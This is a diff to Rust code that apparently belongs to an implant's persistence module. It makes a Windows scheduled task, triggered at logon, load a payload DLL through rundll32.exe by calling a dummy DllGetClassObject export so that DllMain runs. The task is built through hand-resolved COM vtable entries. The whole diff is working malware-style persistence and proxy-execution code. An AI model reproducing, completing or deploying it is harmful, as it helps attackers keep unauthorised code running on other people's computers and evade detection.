@@ -408,15 +408,43 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
         
         // IExecAction::put_Path
         // Inherits IAction (IDispatch + 4 props: 7,8,9,10 Id, Type).
-        // IExecAction adds: 11:put_Path, 12:get_Path... Check docs.
-        // IExecAction: get_Path(10), put_Path(11).
+        // IExecAction: get_Path(10), put_Path(11), get_Arguments(12), put_Arguments(13)
         let vtbl_exec = *(p_action as *const *const *const c_void);
         type FnPutPath = unsafe extern "system" fn(*mut c_void, *const u16) -> i32;
-        let put_path: FnPutPath = std::mem::transmute(*vtbl_exec.add(11));
+        type FnPutArgs = unsafe extern "system" fn(*mut c_void, *const u16) -> i32;
         
-        let exe_bstr = sys_alloc(to_wide(exe_path).as_ptr());
-        put_path(p_action, exe_bstr);
-        sys_free(exe_bstr);
+        let put_path: FnPutPath = std::mem::transmute(*vtbl_exec.add(11));
+        let put_args: FnPutArgs = std::mem::transmute(*vtbl_exec.add(13)); // Index 13
+        
+        // Detect if we are persisting a DLL or EXE
+        let is_dll = exe_path.to_lowercase().ends_with(".dll");
+
+        if is_dll {
+            // Use rundll32.exe to host the DLL
+            // Path: C:\Windows\System32\rundll32.exe
+            // Args: "C:\Path\To\Payload.dll",DllGetClassObject
+            // Note: DllGetClassObject is just a dummy export to trigger LoadLibrary -> DllMain
+            
+            let sys_root = std::env::var("SystemRoot").unwrap_or("C:\\Windows".to_string());
+            let rundll = format!("{}\\System32\\rundll32.exe", sys_root);
+            
+            let path_bstr = sys_alloc(to_wide(&rundll).as_ptr());
+            put_path(p_action, path_bstr);
+            sys_free(path_bstr);
+
+            let args = format!("\"{}\",DllGetClassObject", exe_path);
+            let args_bstr = sys_alloc(to_wide(&args).as_ptr());
+            put_args(p_action, args_bstr);
+            sys_free(args_bstr);
+            
+            crate::k::debug::log_detail!("Task Configured: Rundll32 hosting");
+
+        } else {
+            // Standard EXE execution
+            let exe_bstr = sys_alloc(to_wide(exe_path).as_ptr());
+            put_path(p_action, exe_bstr);
+            sys_free(exe_bstr);
+        }
         
         // 5. Configure Trigger (Logon)
         // ITaskDefinition::get_Triggers (Index 9)
